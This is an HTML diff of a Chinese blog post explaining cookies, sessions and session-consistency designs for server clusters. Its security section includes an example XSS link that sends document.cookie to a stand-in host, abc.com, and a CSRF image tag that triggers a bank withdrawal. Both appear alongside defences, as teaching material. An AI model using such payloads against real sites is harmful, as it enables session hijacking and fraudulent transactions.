@@ -1,0 +1,1400 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="web中的会话跟踪技术">
+<meta name="keywords" content="会话机制,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cookie与session">
+<meta property="og:url" content="https://jiesunn.github.io/2018/07/08/2018-07-08-cookie与session/index.html">
+<meta property="og:site_name" content="JieSunn - BLOG">
+<meta property="og:description" content="web中的会话跟踪技术">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://jiesunn.github.io/2018/07/08/2018-07-08-cookie与session/pic1.jpeg">
+<meta property="og:image" content="https://jiesunn.github.io/2018/07/08/2018-07-08-cookie与session/pic2.png">
+<meta property="og:image" content="https://jiesunn.github.io/2018/07/08/2018-07-08-cookie与session/pic3.png">
+<meta property="og:image" content="https://jiesunn.github.io/2018/07/08/2018-07-08-cookie与session/pic4.png">
+<meta property="og:image" content="https://jiesunn.github.io/2018/07/08/2018-07-08-cookie与session/pic5.png">
+<meta property="og:image" content="https://jiesunn.github.io/2018/07/08/2018-07-08-cookie与session/pic6.png">
+<meta property="og:image" content="https://jiesunn.github.io/2018/07/08/2018-07-08-cookie与session/pic7.png">
+<meta property="og:image" content="https://jiesunn.github.io/2018/07/08/2018-07-08-cookie与session/pic8.png">
+<meta property="og:image" content="https://jiesunn.github.io/2018/07/08/2018-07-08-cookie与session/pic9.png">
+<meta property="og:updated_time" content="2019-09-09T04:59:41.450Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="cookie与session">
+<meta name="twitter:description" content="web中的会话跟踪技术">
+<meta name="twitter:image" content="https://jiesunn.github.io/2018/07/08/2018-07-08-cookie与session/pic1.jpeg">
+
+
+
+
+
+
+  <link rel="canonical" href="https://jiesunn.github.io/2018/07/08/2018-07-08-cookie与session/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>cookie与session | JieSunn - BLOG</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+
+    <div class="headband">
+      <a href="https://github.com/jiesunn" class="github-corner" aria-label="View source on GitHub">
+        <svg width="80" height="80" viewbox="0 0 250 250" style="z-index:999; fill:#FD6C6C; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true">
+          <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/>
+          <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/>
+          <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/>
+        </svg>
+      </a>
+<style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    </div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">JieSunn - BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jiesunn.github.io/2018/07/08/2018-07-08-cookie与session/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JieSunn">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JieSunn - BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">cookie与session
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-07-08 20:46:25" itemprop="dateCreated datePublished" datetime="2018-07-08T20:46:25+08:00">2018-07-08</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><i class="fa fa-quote-left"></i> web中的会话跟踪技术 <i class="fa fa-quote-right"></i></p>
+<a id="more"></a>
+
+<h3 id="为什么要有cookie-session"><a href="#为什么要有cookie-session" class="headerlink" title="为什么要有cookie/session?"></a>为什么要有cookie/session?</h3><p>在客户端浏览器向服务器发送请求，服务器做出响应之后，二者便会断开连接(一次会话结束)。那么下次用户再来请求服务器，服务器没有任何办法去识别此用户是谁。比如web系统常用的用户登录功能，如果没有cookie机制支持，那么只能通过查询数据库实现，并且要命的是每次刷新页面都要重新输入表单信息查询一次数据库才可以识别用户，这会给开发人员带来大量冗余工作并且简单的用户登录功能会给服务器带来巨大的压力。</p>
+<p>在此背景下，就急需一种机制来解决此问题。分析可知，以上需求的实现就要客户端每次访问服务器时从客户端带上一些数据(相当于身份证)告知服务器自己是谁。这个数据就是cookie！并且客户端访问服务器时不能将所有cookie都带过去，比如访问百度就不能把谷歌的cookie带给百度，这个设置方式在后面介绍。</p>
+<p>那么有了cookie，为什么还要有session呢？有了cookie可以向服务器证明用户身份了，我们的web系统中是不是需要将用户的详细信息储存在某个位置供页面调用呢？用户的详细信息就包括姓名，年龄，性别等信息。而cookie是存在于客户端的，将用户详细信息通过网络发送到客户端保存是极不安全的。且cookie大小不能超过4k，不能支持中文。这就限制cookie不能满足存储用户信息的需求。这就需要一种机制在服务器端的某个域中存储一些数据，这个域就是session。</p>
+<p>总而言之，cookie/session的出现就是为了解决http协议无状态的弊端，为了让客户端和服务端建立长久联系而出现的。</p>
+<img src="/2018/07/08/2018-07-08-cookie与session/pic1.jpeg">
+
+<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><h4 id="cookie是什么"><a href="#cookie是什么" class="headerlink" title="cookie是什么"></a>cookie是什么</h4><p>cookie翻译过来是“饼干，甜品”的意思，cookie在网络应用中到处存在，当我们浏览之前访问过的网站，网页中可能会显示：你好，王小二，这就会让我们感觉很亲切，像吃了一块很甜的饼干一样。其实cookie是一个很小的文本文件，是浏览器储存在用户的机器上的。Cookie是纯文本，没有可执行代码。储存一些服务器需要的信息，每次请求站点，会发送相应的cookie，这些cookie可以用来辨别用户身份信息等作用。</p>
+<img src="/2018/07/08/2018-07-08-cookie与session/pic2.png">
+
+<p>如图所示，用户首次访问服务器，服务器会返回一个独一无二的识别码：id=23451。这样服务器可以用这个id跟踪记录用户的信息：购物历史、地址信息等）。cookie可以包含任意的信息，不仅仅是id，客户端会记录服务器返回来的Set-Cookie首部中的cookie内容。并将cookie存储在浏览器的cookie数据库中，当用户访问同一站点时，浏览器就会挑选当时该站点颁发的id=XXX的身份证（cookie），并在Cookie请求首部发送过去。</p>
+<h4 id="主要特性"><a href="#主要特性" class="headerlink" title="主要特性"></a>主要特性</h4><ul>
+<li>每次请求都会在头带上cookie（带宽流量）</li>
+<li>Cookie的主要内容包括：名字，值，过期时间，路径和域</li>
+<li>名字和值以key=&gt;value形式，保存在客户端（不能超过4k，不能支持中文）</li>
+<li>过期时间可设置：<ul>
+<li>cookie.setMaxAge(0)（立即删除cookie）</li>
+<li>cookie.setMaxAge(-1)（缺省值，只将cookie保存在内存中，浏览器一旦关闭，cookie就会被清空）</li>
+<li>cookie.setMaxAge(60*60)（浏览器会将cookie保存在硬盘上，超过指定时间会删除该cookie）</li>
+</ul>
+</li>
+<li>路径和域就是对应的域名，a网站的cookie自然不能给b用，具有不可跨域名性</li>
+</ul>
+<h4 id="安全性问题"><a href="#安全性问题" class="headerlink" title="安全性问题"></a>安全性问题</h4><p>多数网站使用cookie作为用户会话的唯一标识，因为其他的方法具有限制和漏洞。如果一个网站使用cookies作为会话标识符，攻击者可以通过窃取一套用户的cookies来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者的，因为用户和攻击者拥有相同的身份验证。 下面介绍几种cookie盗用和会话劫持的例子：</p>
+<h5 id="网络窃听"><a href="#网络窃听" class="headerlink" title="网络窃听"></a>网络窃听</h5><p>网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式WIFI。这种流量包含在普通的未加密的HTTP清求上发送Cookie。在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含HTTP Cookie的全部内容，以便进行中间的攻击。比如：拦截cookie来冒充用户身份执行恶意任务（银行转账等）。</p>
+<p>解决办法：服务器可以设置secure属性的cookie，这样就只能通过https的方式来发送cookies了。</p>
+<h5 id="DNS缓存中毒"><a href="#DNS缓存中毒" class="headerlink" title="DNS缓存中毒"></a>DNS缓存中毒</h5><p>如果攻击者可以使DNS缓存中毒，那么攻击者就可以访问用户的Cookie了。</p>
+<p>例如：攻击者使用DNS中毒来创建一个虚拟的NDS服务 <u>h123456.demo.com</u> 指向攻击者服务器的ip地址。然后攻击者可以从服务器 <u>h123456.demo.com/img_01.png</u> 发布图片。用户访问这个图片，由于 <u>demo.com</u> 和 <u>h123456.demo.com</u> 是同一个子域，所以浏览器会把用户的与 <u>demo.com</u> 相关的cookie都会发送到 <u>h123456.demo.com</u> 这个服务器上，这样攻击者就会拿到用户的cookie搞事情。</p>
+<h5 id="跨站点脚本XSS"><a href="#跨站点脚本XSS" class="headerlink" title="跨站点脚本XSS"></a>跨站点脚本XSS</h5><p>使用跨站点脚本技术可以窃取cookie。当网站允许使用javascript操作cookie的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的cookie信息。</p>
+<p>例子：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">onclick</span>=`<span class="attr">window.location</span>=<span class="string">http://abc.com?cookie</span>=<span class="string">$&#123;docuemnt.cookie&#125;</span>`&gt;</span>领取红包<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果这个网站用户的cookie信息就会被发送到abc.com攻击者的服务器。攻击者同样可以拿cookie搞事情。</p>
+<p>解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。</p>
+<h5 id="跨站请求伪造CSRF"><a href="#跨站请求伪造CSRF" class="headerlink" title="跨站请求伪造CSRF"></a>跨站请求伪造CSRF</h5><p>例如，SanShao可能正在浏览其他用户XiaoMing发布消息的聊天论坛。假设XiaoMing制作了一个引用ShanShao银行网站的HTML图像元素，例如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.bank.com/withdraw?user=SanShao&amp;amount=999999&amp;for=XiaoMing"</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果SanShao的银行将其认证信息保存在cookie中，并且cookie尚未过期，(当然是没有其他验证身份的东西)，那么SanShao的浏览器尝试加载该图片将使用他的cookie提交提款表单，从而在未经SanShao批准的情况下授权交易。</p>
+<p>解决办法：增加其他信息的校验（手机验证码，或者其他盾牌）。</p>
+<h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><h4 id="session是什么"><a href="#session是什么" class="headerlink" title="session是什么"></a>session是什么</h4><p>session，中文经常翻译为会话，其本来的含义是指有始有终的一系列动作/消息，比如打电话时从拿起电话拨号到挂断电话这中间的一系列过程可以称之为一个session。到了web服务器蓬勃发展的时代，session在web开发语境下的语义又有了新的扩展，它的含义是指一类用来在客户端与服务器之间保持状态的解决方案。有时候session也用来指这种解决方案的存储结构，如“把xxx保存在session里”。</p>
+<img src="/2018/07/08/2018-07-08-cookie与session/pic3.png">
+
+<p>如上图的登录流程，用户在浏览器输入用户名、密码，点击登录，浏览器会将用户名密码提交到服务器程序进行处理；服务器验证用户名、密码正确后，会返回登录成功信息，并且会修改服务器端的session内容，比如我们将用户ID写入session中，为了方便存储这些session的内容会被序列化成字符串或者二进制保存在文件或者数据库中，这时候大多数情况下服务器在对当前的http请求进行响应时，会返回一个新的sessionid要求浏览器写入本地cookie中，对应的返回的http响应头部信息应该会是是这个样子的set-cookie:PHPSESSID=xxxxxxx,浏览器解析到这个头之后就会在当前生成一个cookie关联当前的域名。</p>
+<h4 id="主要特性-1"><a href="#主要特性-1" class="headerlink" title="主要特性"></a>主要特性</h4><ul>
+<li>存在服务器的一种用来存放用户数据的类HashTable结构（文件、数据库/redis、内存）</li>
+<li>通过Session ID来唯一标识这个HashTable（时间限制默认30分钟，超时后毁掉这个值）</li>
+<li>静态资源不会生成session</li>
+<li>访问服务器一次就更新一次session的最后访问时间，无论是否有对session读写，超时既最后访问时间</li>
+<li>若客户端禁止cookie，Session ID可在url中（附加信息/查询字符串）</li>
+<li>域的支持范围不一样，比方说 <u>a.com</u> 的Cookie在 <u>a.com</u> 下都能用，而 <u>dev.a.com</u> 的Session在 <u>api.a.com</u> 下不能用，解决这个问题的办法是JSONP或者跨域资源共享。</li>
+</ul>
+<h4 id="一致性问题"><a href="#一致性问题" class="headerlink" title="一致性问题"></a>一致性问题</h4><p>单服务器web应用中，session信息只需存在该服务器中，这是我们前几年最常接触的方式，但是近几年随着分布式系统的流行，单系统已经不能满足日益增长的百万级用户的需求，集群方式部署服务器已在很多公司运用起来，当高并发量的请求到达服务端的时候通过负载均衡的方式分发到集群中的某个服务器，这样就有可能导致同一个用户的多次请求被分发到集群的不同服务器上，就会出现取不到session数据的情况，于是session的共享就成了一个问题。</p>
+<img src="/2018/07/08/2018-07-08-cookie与session/pic4.png">
+
+<p>如上图，假设用户包含登录信息的session都记录在第一台web-server上，反向代理如果将请求路由到另一台web-server上，可能就找不到相关信息，而导致用户需要重新登录。</p>
+<h5 id="session复制（同步）"><a href="#session复制（同步）" class="headerlink" title="session复制（同步）"></a>session复制（同步）</h5><img src="/2018/07/08/2018-07-08-cookie与session/pic5.png">
+
+<p><strong>思路</strong>：多个web-server之间相互同步session，这样每个web-server之间都包含全部的session</p>
+<p><strong>优点</strong>：web-server支持的功能，应用程序不需要修改代码</p>
+<p><strong>缺点</strong>：</p>
+<ul>
+<li>session的同步需要数据传输，占内网带宽，有时延</li>
+<li>所有web-server都包含所有session数据，数据量受内存限制，无法水平扩展</li>
+<li>有更多web-server时要歇菜</li>
+</ul>
+<h5 id="客户端存储法"><a href="#客户端存储法" class="headerlink" title="客户端存储法"></a>客户端存储法</h5><img src="/2018/07/08/2018-07-08-cookie与session/pic6.png">
+
+<p><strong>思路</strong>：服务端存储所有用户的session，内存占用较大，可以将session存储到浏览器cookie中，每个端只要存储一个用户的数据了</p>
+<p><strong>优点</strong>：服务端不需要存储</p>
+<p><strong>缺点</strong>：</p>
+<ul>
+<li>每次http请求都携带session，占外网带宽</li>
+<li>数据存储在端上，并在网络传输，存在泄漏、篡改、窃取等安全隐患</li>
+<li>session存储的数据大小受cookie限制</li>
+</ul>
+<p>“端存储”的方案虽然不常用，但确实是一种思路。</p>
+<h5 id="反向代理hash一致性"><a href="#反向代理hash一致性" class="headerlink" title="反向代理hash一致性"></a>反向代理hash一致性</h5><p><strong>思路</strong>：web-server为了保证高可用，有多台冗余，反向代理层能不能做一些事情，让同一个用户的请求保证落在一台web-server上呢？</p>
+<p><strong>方案一：四层代理hash</strong></p>
+<p>反向代理层使用用户ip来做hash，以保证同一个ip的请求落在同一个web-server上</p>
+<img src="/2018/07/08/2018-07-08-cookie与session/pic7.png">
+
+<p><strong>方案二：七层代理hash</strong></p>
+<img src="/2018/07/08/2018-07-08-cookie与session/pic8.png">
+
+<p>反向代理使用http协议中的某些业务属性来做hash，例如sid，city_id，user_id等，能够更加灵活的实施hash策略，以保证同一个浏览器用户的请求落在同一个web-server上</p>
+<p><strong>优点</strong>：</p>
+<ul>
+<li>只需要改nginx配置，不需要修改应用代码</li>
+<li>负载均衡，只要hash属性是均匀的，多台web-server的负载是均衡的</li>
+<li>可以支持web-server水平扩展（session同步法是不行的，受内存限制）</li>
+</ul>
+<p><strong>不足</strong>：</p>
+<ul>
+<li>如果web-server重启，一部分session会丢失，产生业务影响，例如部分用户重新登录</li>
+<li>如果web-server水平扩展，rehash后session重新分布，也会有一部分用户路由不到正确的session</li>
+<li>session一般是有有效期的，所有不足中的两点，可以认为等同于部分session失效，一般问题不大。</li>
+</ul>
+<p>对于四层hash还是七层hash，个人推荐前者：让专业的软件做专业的事情，反向代理就负责转发，尽量不要引入应用层业务属性，除非不得不这么做（例如，有时候多机房多活需要按照业务属性路由到不同机房的web-server）。</p>
+<h5 id="后端统一集中存储"><a href="#后端统一集中存储" class="headerlink" title="后端统一集中存储"></a>后端统一集中存储</h5><img src="/2018/07/08/2018-07-08-cookie与session/pic9.png">
+
+<p><strong>思路</strong>：将session存储在web-server后端的存储层，数据库或者缓存</p>
+<p><strong>优点</strong>：</p>
+<ul>
+<li>没有安全隐患</li>
+<li>可以水平扩展，数据库/缓存水平切分即可</li>
+<li>web-server重启或者扩容都不会有session丢失</li>
+</ul>
+<p><strong>不足</strong>：增加了一次网络调用，并且需要修改应用代码</p>
+<p>对于db存储还是cache，个人推荐后者：session读取的频率会很高，数据库压力会比较大。如果有session高可用需求，cache可以做高可用，但大部分情况下session可以丢失，一般也不需要考虑高可用。</p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>保证session一致性的架构设计常见方法：</p>
+<ul>
+<li>session同步法：多台web-server相互同步数据</li>
+<li>客户端存储法：一个用户只存储自己的数据</li>
+<li>反向代理hash一致性：四层hash和七层hash都可以做，保证一个用户的请求落在一台web-server上</li>
+<li>后端统一存储：web-server重启和扩容，session也不会丢失</li>
+</ul>
+<p>对于方案3和方案4，个人建议推荐后者：</p>
+<ul>
+<li>web层、service层无状态是大规模分布式系统设计原则之一，session属于状态，不宜放在web层</li>
+<li>让专业的软件做专业的事情，web-server存session？还是让cache去做这样的事情吧。</li>
+</ul>
+
+      
+    </div>
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/会话机制/" rel="tag"><i class="fa fa-tag">会话机制</i></a>
+          
+            <a href="/tags/web/" rel="tag"><i class="fa fa-tag">web</i></a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/06/2018-07-06-正向代理与反向代理/" rel="next" title="正向代理与反向代理">
+                <i class="fa fa-chevron-left"></i> 正向代理与反向代理
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/07/09/2018-07-09-HTTP状态码/" rel="prev" title="HTTP状态码">
+                HTTP状态码 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="JieSunn">
+            
+              <p class="site-author-name" itemprop="name">JieSunn</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">46</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">27</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/jiesunn" title="GitHub &rarr; https://github.com/jiesunn" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:jiesunn@foxmail.com" title="E-Mail &rarr; mailto:jiesunn@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
